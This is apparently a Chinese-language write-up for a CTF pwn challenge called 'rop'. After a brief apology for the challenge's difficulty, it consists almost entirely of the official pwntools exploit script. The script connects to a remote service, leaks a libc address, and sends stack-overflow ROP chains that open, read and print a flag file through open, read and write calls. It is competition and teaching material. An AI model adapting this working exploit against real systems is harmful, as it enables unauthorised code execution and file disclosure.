# Writeup for rop

本来打算出一道简单的栈溢出题，结果自己出的题目环境有问题，然后我在~~嫖~~出 web 题时发现里面有几道 pwn 题，于是就顺便偷了一道，但是没想到这是里面最难的，其已经远超出了比赛设计的难度，所以这里要向各位大佬诚恳的说一声对不起，下次出题前一定好好验题 orz.

另外附上本道题官方的 exp，有兴趣的大佬可以自行研究，题解我便不再此赘述了。如果想了解相关思路的大佬可以自行上网搜索2021年moectf specail_rop

## exp.py
```python
from pwn import *
context(arch='amd64', os='linux', log_level='debug')


def uu32(data): return u32(data.ljust(4, '\x00'))
def uu64(data): return u64(data.ljust(8, '\x00'))


#p = process(['./orw'],env={"LD_PRELOAD":"./libc6_2.27-3ubuntu1.4_amd64.so"})
p = remote("101.132.126.194", 28180)
elf = ELF('./orw')
libc = ELF('./libc-2.27.so')


# gadgets

#puts_plt     = elf.plt['puts']
#puts_got     = elf.got['puts']
pop_rdi = 0x401503
pop_rsi_r15 = 0x401501
start = 0x401140
bss_addr = 0x404080
return_addr = 0x401490
vuln = 0x401422

p.recvuntil('Before that here is a gift: ')
puts_addr = int(p.recvline().strip(b'\n'), 16)
print(hex(puts_addr))

libc_base = puts_addr-libc.symbols['puts']
open_addr = libc_base+libc.symbols['open']
read_addr = libc_base+libc.symbols['read']
write_addr = libc_base+libc.symbols['write']
gets_addr = libc_base+libc.symbols['gets']

pop_rax = libc_base+next(libc.search(asm('pop rax\nret')))
pop_rsi = libc_base+next(libc.search(asm('pop rsi\nret')))
syscall = libc_base+next(libc.search(asm('syscall\nret')))
pop_rdx_rsi = libc_base+0x130569

print('open:', hex(open_addr))
print('read:', hex(read_addr))
print('write:', hex(write_addr))

p.recvuntil('Here is a message book:\n\n')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(bss_addr)+p64(gets_addr)+p64(vuln)

p.sendline(payload)
p.sendline('./flag')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(bss_addr)+p64(pop_rsi) + \
    p64(0)+p64(pop_rax)+p64(2)+p64(syscall)
payload += p64(pop_rdi)+p64(3)+p64(pop_rdx_rsi)+p64(0x20) + \
    p64(bss_addr+8)+p64(read_addr)+p64(vuln)

p.recvuntil('Here is a message book:\n\n')
p.sendline(payload)

p.recvuntil('Here is a message book:\n\n')

payload = b'A'*(0x78)+p64(pop_rdi)+p64(1)+p64(pop_rdx_rsi) + \
    p64(0x20)+p64(bss_addr+8)+p64(write_addr)+p64(return_addr)

p.sendline(payload)
p.recvuntil('Copy that!!!!\n')
print(p.recv())